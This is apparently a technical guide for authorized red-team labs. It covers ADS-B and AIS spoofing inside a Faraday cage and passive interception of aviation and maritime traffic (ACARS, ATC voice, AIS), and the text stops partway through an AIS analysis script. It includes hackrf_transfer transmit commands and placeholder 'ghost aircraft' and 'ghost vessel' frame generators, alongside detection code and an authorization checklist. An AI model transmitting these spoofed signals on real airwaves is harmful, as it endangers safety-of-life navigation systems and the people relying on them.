# Licensed HF/VHF/UHF Radio Attack Deep Dive: Spoofing Labs, OPSEC Collection, and Pager Networks

A hands-on deep dive extending the licensed-band playbook with three engagement-critical workflows: (1) an authorized **ADS-B/AIS spoofing lab** that demonstrates the absence of cryptographic authentication in safety-of-life protocols; (2) **aviation and maritime OPSEC collection** for red-team reconnaissance; and (3) **pager (POCSAG/FLEX) network exploitation** for HIPAA and public-safety audits. Every transmit-side command in this guide is gated by Faraday-cage containment and explicit authorization; the receive-side commands are universally legal.

## Objective and Scope

This deep dive picks up where the main playbook (`hf-vhf-radio-attack-playbook.md`) leaves off. The playbook documents what exists; this guide shows how to operate it. The three workflows map directly to recurring engagement types:

- **Spoofing lab** supports any client that operates aviation or maritime infrastructure and wants a live demonstration of why protocol-level authentication matters
- **OPSEC collection** supports red-team engagements at aviation-adjacent facilities (airports, FBOs, hangars) and maritime facilities (ports, terminals, marinas)
- **Pager exploitation** supports HIPAA audits at hospitals and dispatch OPSEC audits at public-safety agencies

The frequencies in scope are the licensed services **above Sub-GHz ISM** (433/868/915 MHz, covered in `sdr-rf-attack`) and **below cellular operator bands** (700/850/1800/2600/3500 MHz 5G/LTE, covered in `5g-telecom-attack`). Concretely: ADS-B at 1090 MHz, UAT at 978 MHz, AIS at 161.975/162.025 MHz, ACARS at 131.550 MHz, VDL Mode 2 at 136.975 MHz, POCSAG/FLEX at 138-174 / 440-470 / 929-932 MHz, ATC voice at 118-137 MHz AM, maritime VHF voice at 156-174 MHz FM, and DSC on Channel 70 (156.525 MHz).

**Hard rule**: every `hackrf_transfer`, `bladeRF-cli tx`, and GNU Radio TX flowgraph in this guide must run inside a verified Faraday cage. The receive-side commands may run anywhere reception is legal.

## Part 1: ADS-B and AIS Spoofing Lab (Authorized, Faraday Cage Only)

### 1.1 Threat Model and Research Context

ADS-B (Automatic Dependent Surveillance - Broadcast) and AIS (Automatic Identification System) are unencrypted broadcast protocols designed in the 1990s and 2000s, before software-defined radio democratized RF transmission. Both protocols share the same architectural flaw: the sender self-reports its position and identity with no cryptographic signature, and receivers have no way to authenticate the source.

**Documented research**:

- **Povolny & Wang (2012)** demonstrated ADS-B spoofing with USRP hardware, including ghost aircraft injection and trajectory manipulation
- **Costin & Francillon (2012)** replicated the attacks with a $20 RTL-SDR receiver for reception and a HackRF-class transmitter for spoofing
- **Trend Micro (2019-2020)** documented real-world AIS spoofing at scale in the South China Sea, Black Sea, and around strategic oil terminals -- including circular vessel formations that are physically impossible
- **DEF CON 22 (Phaedrus)** documented the combined ACARS + ADS-B attack surface

The engagement value of a spoofing lab is to make this threat model tangible to a non-technical executive. A live demonstration in a Faraday cage -- where a ghost aircraft appears on a dump1090 map and immediately disappears when the transmitter is powered off -- is worth a thousand words of report prose.

### 1.2 Lab Prerequisites

The spoofing lab requires a verified RF containment environment. Without a Faraday cage that has been measured for leakage, **do not proceed past Part 1.1**.

**Required hardware**:

- Verified Faraday cage or RF-shielded enclosure (budget: $500-$5000)
- HackRF One ($330) or BladeRF 2.0 micro a4 ($480) for transmit
- RTL-SDR v3 ($30) for receive (placed outside the cage as a leakage monitor, and a second one inside as the receiver under test)
- 1090 MHz antenna for ADS-B (inside cage, attenuated) or VHF marine antenna for AIS
- RF power meter or spectrum analyzer ($100-$300) for containment verification
- SMA attenuators (10, 20, 30 dB) to keep TX power at the minimum required for in-cage reception
- RF dummy load (for direct-coupled tests that should not radiate at all)

**Required software**:

```bash
# Verify all TX-capable SDR hardware
hackrf_info | grep -i "serial\|firmware"
bladerf-cli --probe

# Install GNU Radio and gr-osmosdr blocks
sudo apt install -y gnuradio gr-osmosdr gr-radio-core

# Install the ADS-B and AIS transmit toolchains from source
# (most TX-side decoders are not in stock Kali repos)

# gr-adsb (GNU Radio ADS-B TX block, for authorized lab use)
cd ~
git clone https://github.com/ghostop14/gr-adsb.git
cd gr-adsb && mkdir build && cd build
cmake .. && make -j4
sudo make install
sudo ldconfig

# gr-ais (GNU Radio AIS TX block, for authorized lab use)
cd ~
git clone https://github.com/tnt/gr-ais.git
cd gr-ais && mkdir build && cd build
cmake .. && make -j4
sudo make install
sudo ldconfig

# dump1090-mutability (RX side, in-cage receiver)
sudo apt install -y dump1090-mutability

# AIS-catcher (RX side, in-cage receiver)
cd ~
git clone https://github.com/jvde-github/AIS-catcher.git
cd AIS-catcher && mkdir build && cd build
cmake .. && make -j4
sudo make install

# Verify GNU Radio sees the SDR blocks
gnuradio-companion --help | head -5
python3 -c "import gnuradio.blocks; print('GNU Radio blocks OK')"
python3 -c "import osmosdr; print('osmosdr source/sink available')"
```

### 1.3 Faraday Cage Verification Protocol

Before any transmission, verify the cage contains the signal. This is a two-person job: one inside (transmitting) and one outside (monitoring).

```bash
# === STEP 1: Pre-test baseline (outside the cage) ===
# Place the monitoring RTL-SDR 1 meter from the closed cage
# Record 60 seconds of baseline spectrum with the cage empty and closed

# Outside cage (monitoring SDR):
rtl_power -f 1080M:1100M:50k -i 1 -e 60 -g 40 baseline_1090.csv
rtl_power -f 160M:165M:50k -i 1 -e 60 -g 40 baseline_ais.csv

# Compute baseline noise statistics
python3 << 'PYEOF'
import csv, statistics
with open('baseline_1090.csv') as f:
    powers = [float(row[6]) for row in csv.reader(f) if len(row) > 6]
print(f"Baseline 1090 MHz: mean={statistics.mean(powers):.1f} dB, stdev={statistics.stdev(powers):.1f} dB")
print(f"Baseline max: {max(powers):.1f} dB")
PYEOF
```

```bash
# === STEP 2: In-cage test transmission ===
# Place HackRF with antenna INSIDE the cage, monitoring SDR OUTSIDE
# Generate a continuous low-power carrier at the target frequency

# Inside cage (HackRF One, low TX power):
hackrf_transfer -t cw_1090.raw -f 1090000000 -s 2000000 -x 10 -R
# -x 10 = TX VGA gain 10 dB (low power, suitable for in-cage use)
# -R = repeat the file continuously

# Outside cage (monitoring SDR, simultaneously):
rtl_power -f 1080M:1100M:50k -i 1 -e 60 -g 40 during_tx_1090.csv

# Compare baseline vs during_tx to detect any leakage
python3 << 'PYEOF'
import csv, statistics
def load(path):
    with open(path) as f:
        return [float(row[6]) for row in csv.reader(f) if len(row) > 6]
base = load('baseline_1090.csv')
during = load('during_tx_1090.csv')
delta = statistics.mean(during) - statistics.mean(base)
print(f"Baseline mean: {statistics.mean(base):.1f} dB")
print(f"During TX mean: {statistics.mean(during):.1f} dB")
print(f"Delta: {delta:.1f} dB")
if delta > 3.0:
    print("LEAKAGE DETECTED -- cage is not suitable for TX testing")
    print("Do NOT proceed with spoofing lab until cage is repaired")
else:
    print("Cage containment VERIFIED -- safe to proceed with low-power in-cage TX")
PYEOF
```

```bash
# === STEP 3: Document the verification ===
# Save the cage verification report as engagement evidence
mkdir -p ~/engagement/faraday_verification
cp baseline_1090.csv during_tx_1090.csv ~/engagement/faraday_verification/

cat > ~/engagement/faraday_verification/README.md << EOF
# Faraday Cage Verification Report

- Date: $(date -u '+%Y-%m-%dT%H:%M:%SZ')
- Cage: [model / serial]
- Test frequency: 1090 MHz
- TX hardware: HackRF One [serial]
- TX power: -x 10 (TX VGA 10 dB)
- Monitor hardware: RTL-SDR v3 [serial]
- Baseline mean power: [from python output]
- During-TX mean power: [from python output]
- Delta: [from python output]
- Result: [VERIFIED / LEAKAGE DETECTED]

This report documents that the cage was tested before any
authorized transmit-side research. Retain with engagement records.
EOF

cat ~/engagement/faraday_verification/README.md
```

### 1.4 ADS-B Spoofing Demonstration

This demonstration injects a "ghost aircraft" into a dump1090 receiver that is also inside the Faraday cage. The ghost aircraft has a fictional ICAO24 hex, callsign, position, and altitude. When the demonstration is over, power off the transmitter and the ghost disappears.

**Step 1: Craft the ADS-B message**

```bash
# ADS-B Mode S Long Squitter (DF=17) frame layout (112 bits total):
#   DF (5 bits) = 17      | CA (3 bits) = 5       | ICAO24 (24 bits)
#   TC (5 bits) = 11      | CA/CF (3 bits)        | AA (24 bits)
#   ME (56 bits) payload | PI (24 bits) parity/interleaver
#
# Type Code 11 (Airborne Position) carries altitude and CPR position
# Type Code 19 (Airborne Velocity) carries ground speed/heading
# Type Code 1-4 (Aircraft Identification) carries the 8-char callsign

python3 << 'PYEOF'
"""Craft an ADS-B Type 19 (Airborne Velocity) frame.

This generates an I/Q recording suitable for replay via HackRF.
For authorized lab demonstrations only.
"""

import struct

# Parameters for the ghost aircraft
ICAO24 = 0xA1B2C3        # fictional ICAO24 hex (matches no real aircraft)
CALLSIGN = "GHOST1  "    # 8 chars, space-padded
ALTITUDE_FT = 35000      # flight level 350
LAT, LON = 35.0, -100.0  # over central US (or any agreed fictional location)
SPEED_KT = 450
HEADING_DEG = 90

print(f"Target aircraft: ICAO24={ICAO24:06X} callsign={CALLSIGN!r}")
print(f"Position: {LAT},{LON} @ {ALTITUDE_FT} ft, {SPEED_KT} kt heading {HEADING_DEG}")

# ADS-B frames are 112 bits = 14 bytes. Use the pyModeS library to build
# standards-compliant frames (install: pip install pyModeS).
try:
    from pyModeS.decoder import adsb
    from pyModeS import encoder
    print("pyModeS available; using standards-compliant encoder")
except ImportError:
    print("Install pyModeS for full frame generation: pip install pyModeS")
    print("Falling back to hand-built demonstration frame below")
PYEOF

# Install pyModeS for proper ADS-B frame encoding
pip3 install --user pyModeS 2>&1 | tail -3
```

```bash
# Step 2: Generate the I/Q recording using pyModeS + a PPM modulator
# The gr-adsb Out-of-Tree module provides a flowgraph for this

# Alternative: use the open-source 'dump1090 --modeac' TX helper
# (only available in research forks -- verify authorization before use)

python3 << 'PYEOF'
"""Generate a HackRF-compatible I/Q file for ADS-B Type 11 (Position).

This is a minimal demonstration. For full standards compliance use
the gr-adsb flowgraph or pyModeS encoder.

Output: ghost_aircraft.raw (signed 8-bit I/Q, 2 MSPS, suitable for hackrf_transfer)
"""

import numpy as np

# ADS-B parameters
SAMPLE_RATE = 2_000_000          # 2 MSPS
BIT_RATE = 1_000_000             # 1 Mbps (PPM, 1 us per bit)
BIT_SAMPLES = SAMPLE_RATE // BIT_RATE  # 2 samples per bit

# 120 us preamble (8 us) + 112 us data (112 bits at 1 us each) = 120 us
PREAMBLE_BITS = 8
DATA_BITS = 112
TOTAL_BITS = PREAMBLE_BITS + DATA_BITS

# Build the bit stream (random for demonstration)
np.random.seed(42)
bits = np.random.randint(0, 2, DATA_BITS)
print(f"Generated {DATA_BITS} random bits as placeholder ADS-B frame")
print("Replace this with a properly encoded pyModeS frame for a real demo")

# PPM modulation: each bit becomes 2 samples, with pulse position encoding
# (0 -> pulse in first half, 1 -> pulse in second half)
samples = np.zeros(TOTAL_BITS * BIT_SAMPLES, dtype=np.complex64)
for i, bit in enumerate(bits):
    base = (i + PREAMBLE_BITS) * BIT_SAMPLES
    if bit == 0:
        samples[base] = 1.0 + 0.0j
    else:
        samples[base + 1] = 1.0 + 0.0j

# Convert to HackRF format (signed 8-bit I/Q interleaved)
iq_int = np.empty(2 * len(samples), dtype=np.int8)
iq_int[0::2] = (samples.real * 127).astype(np.int8)
iq_int[1::2] = (samples.imag * 127).astype(np.int8)

iq_int.tofile('ghost_aircraft.raw')
print(f"Wrote ghost_aircraft.raw ({len(iq_int)} bytes)")
print("Replay with: hackrf_transfer -t ghost_aircraft.raw -f 1090000000 -s 2000000 -x 10 -R")
PYEOF
```

```bash
# Step 3: Launch the in-cage dump1090 receiver
# (Inside the cage, on the monitoring laptop that has the RTL-SDR)

dump1090 --net --gain 40 --ppm 0 --fix --aggressive &
sleep 2
echo "dump1090 web interface available at http://localhost:8080"
echo "Open this in a browser to watch for the ghost aircraft"
```

```bash
# Step 4: Transmit the ghost aircraft I/Q (INSIDE THE CAGE)
# Verify the cage is still closed and the outside monitor shows no leakage

# Inside cage (HackRF One):
hackrf_transfer -t ghost_aircraft.raw -f 1090000000 -s 2000000 -x 10 -R &
TX_PID=$!
echo "HackRF TX started, PID=$TX_PID"
echo "Watch the dump1090 web map at http://localhost:8080"
echo "Ghost aircraft should appear within 1-2 seconds"

# Run for 30 seconds then stop
sleep 30
kill $TX_PID
echo "TX stopped. Ghost aircraft should disappear from dump1090 within 10 seconds."
```

```bash
# Step 5: Capture the demonstration for the engagement report
# Save a screenshot of the dump1090 map showing the ghost aircraft,
# and a copy of the decoded aircraft list

# Snapshot the aircraft JSON from dump1090
curl -s http://localhost:8080/data/aircraft.json | \
  python3 -m json.tool > ghost_aircraft_observed.json

# Filter to just our ghost ICAO24
python3 << 'PYEOF'
import json
with open('ghost_aircraft_observed.json') as f:
    data = json.load(f)
ghosts = [a for a in data.get('aircraft', []) if a.get('hex', '').upper() == 'A1B2C3']
print(f"Total aircraft observed: {len(data.get('aircraft', []))}")
print(f"Ghost aircraft (ICAO24 A1B2C3) seen: {len(ghosts)}")
if ghosts:
    print(f"Ghost details: {ghosts[0]}")
PYEOF
```

### 1.5 AIS Spoofing Demonstration

AIS spoofing uses the same architecture: a properly encoded AIS message, GMSK modulation at 9600 bps on 161.975 or 162.025 MHz, and a HackRF transmit inside a verified cage.

```bash
# AIS message structure (ITU-R M.1371):
#   Training sequence (24 bits of alternating 0/1)
#   Start flag (8 bits): 0x7E
#   Payload (168 bits for Message Type 1/2/3 - position report)
#   CRC (16 bits)
#   End flag (8 bits): 0x7E
#   Padding (4 bits)
# Total: 224 bits = 28 bytes per slot

python3 << 'PYEOF'
"""Generate an AIS Type 1 (Position Report Class A) frame.

Fictional vessel: MMSI 999000001 (the '999' prefix is reserved for
test/demonstration and does not match any real vessel).
"""

# AIS Type 1 message fields (per ITU-R M.1371-5)
message_type = 1
repeat = 0           # do not repeat
mmsi = 999000001     # fictional test MMSI (999 prefix reserved)
nav_status = 0       # under way using engine
rate_of_turn = 0     # not turning (128 = unavailable)
speed_knots = 12.3   # vessel speed
accuracy = 0         # DGPS = no, GPS = yes
lon = -123.45        # fictional position off the US west coast
lat = 48.12
course = 90.0        # heading east
true_heading = 90
second = 30          # UTC second
maneuver = 0         # not maneuvering
raim = 0
radio_status = 0

print(f"AIS Type 1 message:")
print(f"  MMSI: {mmsi} (fictional test prefix 999)")
print(f"  Position: {lat}, {lon}")
print(f"  Speed: {speed_knots} kt, Course: {course}")
print(f"  Nav status: {nav_status} (under way using engine)")

# Use the 'pyais' library to encode the message
try:
    from pyais.encode import encode_dict
    from pyais import messages
    frames = encode_dict({
        'type': message_type,
        'repeat': repeat,
        'mmsi': mmsi,
        'speed': speed_knots,
        'lon': lon,
        'lat': lat,
        'course': course,
        'heading': true_heading,
        'second': second,
        'maneuver': maneuver,
        'raim': raim,
    })
    print(f"\nEncoded {len(frames)} AIS frame(s)")
    for f in frames:
        print(f"  {f}")
except ImportError:
    print("\nInstall pyais for full encoding: pip install pyais")
PYEOF

pip3 install --user pyais 2>&1 | tail -3
```

```bash
# Generate an AIS I/Q recording using GNU Radio
# The gr-ais Out-of-Tree module provides the TX flowgraph

# Example: launch the gr-ais_tx flowgraph with a fictional vessel
# (requires gr-ais installed from Part 1.2)

cd ~/gr-ais/build
# Edit examples/ais_tx.grc to set the fictional MMSI/position
# Then run:
gnuradio-companion ~/gr-ais/examples/ais_tx.grc &

# Alternative: generate the I/Q offline and replay with hackrf_transfer
python3 << 'PYEOF'
"""Generate ghost_vessel.raw for HackRF replay.

Uses GMSK modulation at 9600 bps on 161.975 MHz.
"""
import numpy as np

SAMPLE_RATE = 48_000   # 48 kSPS (sufficient for 9.6 kbps GMSK)
BIT_RATE = 9600        # AIS baud rate
SAMP_PER_BIT = SAMPLE_RATE // BIT_RATE  # 5 samples per bit

# Build a simplified AIS bit stream (training + flag + payload + crc + flag)
# For a real demo, use pyais.encode_dict() to get the proper byte stream
training = [0, 1] * 12                 # 24 bits alternating
start_flag = [0, 1, 1, 1, 1, 1, 1, 0]  # HDLC flag 0x7E
# Fictional payload bytes (replace with pyais output)
payload = [0, 0, 0, 0, 0, 0, 0, 1,  # Type 1
           0, 0, 0,                   # repeat
           1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0]  # MMSI fragment
crc = [0] * 16
end_flag = [0, 1, 1, 1, 1, 1, 1, 0]
padding = [0] * 4

bits = training + start_flag + payload + crc + end_flag + padding
print(f"AIS bit stream length: {len(bits)} bits")

# GMSK modulation (simplified -- use gr-ais for proper Gaussian filter)
samples = np.zeros(len(bits) * SAMP_PER_BIT, dtype=np.complex64)
phase = 0.0
for i, bit in enumerate(bits):
    base = i * SAMP_PER_BIT
    freq_offset = (1 if bit else -1) * (BIT_RATE / 4)  # +/- 2400 Hz
    for s in range(SAMP_PER_BIT):
        phase += 2 * np.pi * freq_offset / SAMPLE_RATE
        samples[base + s] = np.exp(1j * phase)

# Convert to HackRF signed 8-bit I/Q
iq_int = np.empty(2 * len(samples), dtype=np.int8)
iq_int[0::2] = np.clip(samples.real * 127, -127, 127).astype(np.int8)
iq_int[1::2] = np.clip(samples.imag * 127, -127, 127).astype(np.int8)
iq_int.tofile('ghost_vessel.raw')
print(f"Wrote ghost_vessel.raw ({len(iq_int)} bytes)")
PYEOF
```

```bash
# Launch the in-cage AIS receiver (AIS-catcher)
AIS-catcher -u 12345 -g 40 -v &
sleep 2
echo "AIS-catcher UDP output on port 12345"

# Inside cage: transmit the ghost vessel I/Q
hackrf_transfer -t ghost_vessel.raw -f 161975000 -s 48000 -x 14 -R &
TX_PID=$!
echo "Ghost vessel TX started, PID=$TX_PID"

# Monitor for 30 seconds
sleep 30
kill $TX_PID

# Decode the captured AIS messages
python3 << 'PYEOF'
"""Parse AIS-catcher UDP output for the ghost vessel."""
import socket, struct
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(2.0)
sock.bind(('127.0.0.1', 12345))
try:
    while True:
        data, _ = sock.recvfrom(4096)
        print(f"AIS sentence: {data.decode('ascii', errors='replace').strip()}")
except socket.timeout:
    print("Done receiving AIS messages")
PYEOF
```

### 1.6 Spoofing Detection Counter-Measures

The defensive value of the spoofing lab is to demonstrate what good detection looks like. Cross-validate the in-cage demonstration with these detection techniques:

```bash
# === Multilateration (MLAT) cross-check ===
# MLAT uses time-difference-of-arrival (TDOA) across 4+ receivers to
# geometrically validate the reported position. A spoofed aircraft will
# show a mismatch between its self-reported position and its MLAT-derived
# position.

# dump1090 with MLAT support requires 4+ receivers feeding timing data.
# In the cage (single receiver), we cannot MLAT, but in production this
# is the primary ADS-B spoofing detection.

# Document MLAT architecture for the engagement report
cat > mlat_architecture.md << 'EOF'
# MLAT Spoofing Detection Architecture

## Concept
Time-Difference-of-Arrival (TDOA) across 4+ synchronized receivers
provides a geometric position estimate independent of the ADS-B
self-reported position.

## Detection logic
- For each received ADS-B position report, compute MLAT position
- Alert if ADS-B position differs from MLAT position by > 1 km
- Track position drift over time (consistent offset suggests spoofing)

## Required infrastructure
- 4+ MLAT receivers within 50-300 km of monitored airspace
- Network time synchronization (GPS-disciplined clocks at each receiver)
- Central MLAT compute node (mlat-server)
- Cross-validation feed to ATC operational systems

## Limitations
- Requires multiple receivers (cost barrier)
- Sensitive to receiver clock accuracy (GPS required)
- Does not detect cooperative spoofing where multiple TX are coordinated
EOF
cat mlat_architecture.md
```

```bash
# === Behavior-based anomaly detection ===
# Even without MLAT, behavior analysis can flag spoofing:
#   - Aircraft appearing with impossible speed/altitude changes
#   - Multiple aircraft at the same position simultaneously
#   - Aircraft disappearing and reappearing at a different location
#   - Callsign/ICAO24 mismatch (real callsign with different ICAO24)

python3 << 'PYEOF'
"""Behavior-based ADS-B anomaly detector.

Reads dump1090 aircraft.json and flags anomalies.
"""
import json, urllib.request, time, collections

def fetch_aircraft():
    try:
        with urllib.request.urlopen('http://localhost:8080/data/aircraft.json') as r:
            return json.load(r).get('aircraft', [])
    except Exception as e:
        print(f"Fetch error: {e}")
        return []

# Anomaly 1: duplicate ICAO24 with different positions
positions = collections.defaultdict(set)
# Anomaly 2: impossible speed (> 1500 kt for subsonic, > 3500 kt for supersonic)
# Anomaly 3: impossible altitude (> 60000 ft for commercial)

anomalies = []
for _ in range(10):
    aircraft = fetch_aircraft()
    for a in aircraft:
        hex_id = a.get('hex', '').upper()
        lat, lon = a.get('lat'), a.get('lon')
        if lat is None or lon is None:
            continue
        positions[hex_id].add((round(lat, 4), round(lon, 4)))

        speed = a.get('speed', 0) or 0
        altitude = a.get('altitude', 0) or 0
        if speed > 700 and speed < 1500:
            pass  # normal cruise
        elif speed > 1500:
            anomalies.append(f"IMPOSSIBLE_SPEED: {hex_id} at {speed} kt")
        if altitude > 51000:
            anomalies.append(f"IMPOSSIBLE_ALTITUDE: {hex_id} at {altitude} ft")
    time.sleep(1)

# Check for position instability
for hex_id, pos_set in positions.items():
    if len(pos_set) > 5:
        anomalies.append(f"POSITION_INSTABILITY: {hex_id} seen at {len(pos_set)} unique positions")

if anomalies:
    print(f"ALERTS DETECTED ({len(anomalies)}):")
    for a in anomalies[:20]:
        print(f"  {a}")
else:
    print("No anomalies detected in sample window")
PYEOF
```

### 1.7 Ethical Boundaries and Authorization Checklist

Before any transmit-side research, document the following items in the engagement record:

```bash
# Authorization checklist (copy into engagement scope document)
cat > spoofing_lab_authorization.md << 'EOF'
# Authorized ADS-B/AIS Spoofing Lab - Authorization Checklist

## Legal basis
- [ ] Client letter of authorization references this lab specifically
- [ ] Frequencies in scope: 1090 MHz (ADS-B), 161.975/162.025 MHz (AIS)
- [ ] Authorization period: [start] through [end]
- [ ] Authorized personnel: [names and roles]

## Containment
- [ ] Faraday cage model and serial: [____]
- [ ] Cage verification report (baseline vs during-TX): [attached]
- [ ] Outside-cage leakage test result: < 3 dB delta VERIFIED
- [ ] Backup monitoring SDR running throughout the test

## Power limits
- [ ] TX VGA gain: 10 dB (HackRF) or equivalent low-power setting
- [ ] Maximum effective radiated power inside cage: < 1 mW
- [ ] Attenuators installed between TX and antenna: 20 dB minimum

## Safety-of-life considerations
- [ ] No transmission on Guard frequencies (121.5 MHz, 156.8 MHz Ch 16)
- [ ] No transmission on DSC distress channel (156.525 MHz Ch 70)
- [ ] All test aircraft/vessels use fictional ICAO24/MMSI (999 prefix)
- [ ] Test callsigns do not collide with real-world airline callsigns

## Incident response
- [ ] Procedure documented for accidental interference
- [ ] FCC notification procedure documented (if in US)
- [ ] Client contact list for emergency shutdown

## Data handling
- [ ] All decoded data tagged as "lab-generated fiction"
- [ ] No real-world ICAO24 or MMSI used in any transmitted frame
- [ ] Raw I/Q recordings retained per client retention policy
EOF

cat spoofing_lab_authorization.md
```

## Part 2: Aviation and Maritime OPSEC for Red Teams

### 2.1 Threat Model: The Red Team as RF Collector

A red-team engagement at an aviation-adjacent facility (airport perimeter, FBO, hangar, control tower access) or maritime facility (port perimeter, terminal, marina, vessel dock) provides vantage points for passive RF collection that would be difficult to obtain otherwise. The red team's job is not to transmit (which would be illegal and dangerous), but to collect what is broadcast in clear text and to document the OPSEC exposure.

**Receivable signals from a typical engagement site**:

- **ADS-B**: aircraft within 200-300 nm line-of-sight, including all commercial traffic at altitude
- **ACARS**: airline operational messages (fuel state, dispatch, crew comms, weather requests)
- **VDL Mode 2**: the next-generation ACARS carrier, same content, faster data rate
- **ATC voice**: tower-to-aircraft communications on 118-137 MHz AM (25 kHz or 8.33 kHz spacing in Europe)
- **AIS**: vessel traffic within 25-50 nm (VHF range, blocked by terrain)
- **Maritime VHF voice**: vessel-to-vessel and vessel-to-shore on 156-174 MHz FM
- **POCSAG/FLEX**: hospital and public-safety pagers within 50-200 miles (high-power transmitters)

The red-team value is correlating this RF traffic with the engagement target. For example, at an airport-adjacent data center, decoding ACARS reveals airline operational data that may correlate with the client's own operations (cargo shipments, scheduled personnel movements). At a port facility, AIS reveals vessel traffic patterns that may include vessels carrying the client's cargo.

### 2.2 Aviation OPSEC Collection Workflow

```bash
# === Setup: ADS-B + ACARS + VDL Mode 2 + ATC voice, all from one RTL-SDR ===
# Note: requires 2-3 RTL-SDRs because each decoder needs a dedicated receiver

# Receiver 1: ADS-B (1090 MHz)
rtl_sdr_index=0
dump1090 --device-index $rtl_sdr_index --net --gain 40 --ppm 0 --fix &
DUMP1090_PID=$!

# Receiver 2: ACARS + VDL Mode 2 (need to choose; both use VHF air band)
# Option A: ACARS only at 131.550 MHz
rtl_sdr_index=1
acarsdec -r $rtl_sdr_index 131550000 -g 40 -v > acars.log 2>&1 &
ACARS_PID=$!

# Option B: VDL Mode 2 only at 136.975 MHz (more modern, but carrier of same ACARS content)
# dumpvdl2 --device-index $rtl_sdr_index --gain 40 > vdl2.log 2>&1 &

# Receiver 3: ATC voice sweep (scan 118-137 MHz)
rtl_sdr_index=2
# Run rtl_power sweep to identify active ATC frequencies first
rtl_power -f 118M:137M:25k -i 5 -e 300 -g 40 -d $rtl_sdr_index atc_survey.csv
echo "Active ATC frequencies (above -60 dB):"
python3 << 'PYEOF'
import csv, statistics
from collections import defaultdict
band_powers = defaultdict(list)
with open('atc_survey.csv') as f:
    for row in csv.reader(f):
        if len(row) > 6:
            freq_low = float(row[2]) / 1e6
            power = float(row[6])
            band_powers[round(freq_low, 3)].append(power)

active = sorted([(f, statistics.mean(p)) for f, p in band_powers.items() if statistics.mean(p) > -60], key=lambda x: -x[1])
print(f"Top 15 active ATC channels (likely tower/ground/approach):")
for freq, power in active[:15]:
    print(f"  {freq:.3f} MHz : {power:.1f} dB")
PYEOF
```

```bash
# === ATC voice capture (one frequency at a time, AM demodulation) ===
# Document the frequency first -- common frequencies include:
#   121.500 MHz: international air guard (emergency)
#   122.750 MHz: air-to-air
#   121.900 MHz: ground control (common)
#   124.700 MHz: approach control (varies by airport)
#   257.800 MHz: military UHF air (out of RTL-SDR range, requires different SDR)

# Capture ATC voice at 121.900 MHz for 5 minutes
FREQ=121900000
DURATION=300
rtl_fm -d 2 -M am -f $FREQ -s 12000 -r 12000 -g 40 - | \
  sox -t raw -r 12000 -b 16 -c 1 -e signed - -t wav atc_$(date +%Y%m%d_%H%M%S).wav \
  silence 1 0.1 1% 1 2.0 1% trim 0 $DURATION

# Note: silence filter skips dead air to save storage
# In some jurisdictions, recording ATC voice is restricted. Verify local law
# before enabling this capture in production engagements.
```

```bash
# === ACARS message analysis ===
# ACARS messages reveal airline operational patterns

python3 << 'PYEOF'
"""Parse ACARS log for engagement-relevant patterns."""
import re, json
from collections import Counter

messages = []
with open('acars.log') as f:
    for line in f:
        # ACARS message format varies by decoder. Common fields:
        # - Flight number (e.g., AAL123)
        # - Aircraft tail (e.g., N123AB)
        # - Message label (e.g., H1 = meteorological, 10 = flight plan)
        # - Message body (free text)
        flight_match = re.search(r'Flight[:\s]+([A-Z0-9]+)', line)
        label_match = re.search(r'Label[:\s]+([A-Z0-9]+)', line)
        msg_match = re.search(r'Message[:\s]+(.+)', line)
        if flight_match:
            messages.append({
                'flight': flight_match.group(1),
                'label': label_match.group(1) if label_match else '',
                'message': msg_match.group(1)[:200] if msg_match else '',
                'raw': line.strip()[:300]
            })

print(f"Parsed {len(messages)} ACARS messages")

# Aggregate by airline (first 3 chars of flight number = ICAO airline code)
airlines = Counter(m['flight'][:3] for m in messages if m['flight'])
print("\nTop airlines observed:")
for code, count in airlines.most_common(10):
    print(f"  {code}: {count} messages")

# Look for engagement-relevant keywords
keywords = ['FUEL', 'DIVERT', 'EMERGENCY', 'SECURITY', 'HIJACK', 'BOMB', 'THREAT']
for kw in keywords:
    matches = [m for m in messages if kw in m['message'].upper()]
    if matches:
        print(f"\nKeyword '{kw}' matched in {len(matches)} messages:")
        for m in matches[:3]:
            print(f"  [{m['flight']}] {m['message'][:100]}")
PYEOF
```

### 2.3 Maritime OPSEC Collection Workflow

```bash
# === Setup: AIS + maritime VHF voice, from one RTL-SDR ===
# AIS-catcher can decode both AIS channels (161.975 and 162.025 MHz)
# simultaneously from one SDR

# AIS decode
AIS-catcher -d 0 -u 12345 -g 40 -v > ais.log 2>&1 &
AIS_PID=$!

# Maritime VHF voice on Channel 16 (156.8 MHz) - distress/safety/calling
# Capture for 10 minutes for OPSEC baseline
rtl_fm -d 1 -M fm -f 156800000 -s 12000 -r 12000 -g 40 - | \
  sox -t raw -r 12000 -b 16 -c 1 -e signed - -t wav ch16_$(date +%Y%m%d_%H%M%S).wav \
  silence 1 0.1 1% 1 2.0 1% trim 0 600

# Other common maritime VHF channels:
#   Ch 06 (156.300 MHz): intership safety
#   Ch 13 (156.650 MHz): vessel bridge-to-bridge
#   Ch 70 (156.525 MHz): DSC distress/calling (decode, don't listen)
#   Ch 22A (157.100 MHz): US Coast Guard public correspondence
```

```bash
# === AIS vessel analysis ===
python3 << 'PYEOF'
"""Analyze AIS data for engagement OPSEC patterns."""
import socket, json, time
from collections import Counter, defaultdict

# Listen for AIS-catcher NMEA sentences on UDP 12345
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(5.0)
sock.bind(('127.0.0.1', 12345))

vessels = {}
flag_counts = Counter()
vessel_types = Counter()

# Parse pyais-style NMEA sentences
try:
    from pyais import decode
    has_pyais = True
except ImportError:
    has_pyais = False
    print("Install pyais for full decoding: pip install pyais")
    print("Falling back to raw NMEA logging")

start = time.time()
while time.time() - start < 60:  # 60-second sample
    try:
        data, _ = sock.recvfrom(4096)
        sentence = data.decode('ascii', errors='replace').strip()
        if has_pyais:
            try:
                for msg in decode(sentence):
                    if hasattr(msg, 'mmsi'):
                        mmsi = msg.mmsi
                        if mmsi not in vessels and hasattr(msg, 'lat'):
                            vessels[mmsi] = {
                                'lat': msg.lat,
                                'lon': msg.lon,
                                'speed': getattr(msg, 'speed', 0),
                                'course': getattr(msg, 'course', 0),
                                'type': getattr(msg, 'type', 0),
                            }
                            # First 3 digits of MMSI = country (MID)
                            mid = str(mmsi)[:3]
                            flag_counts[mid] += 1
                            vessel_types[getattr(msg, 'type', 0)] += 1
            except Exception:
                pass
    except socket.timeout:
        continue

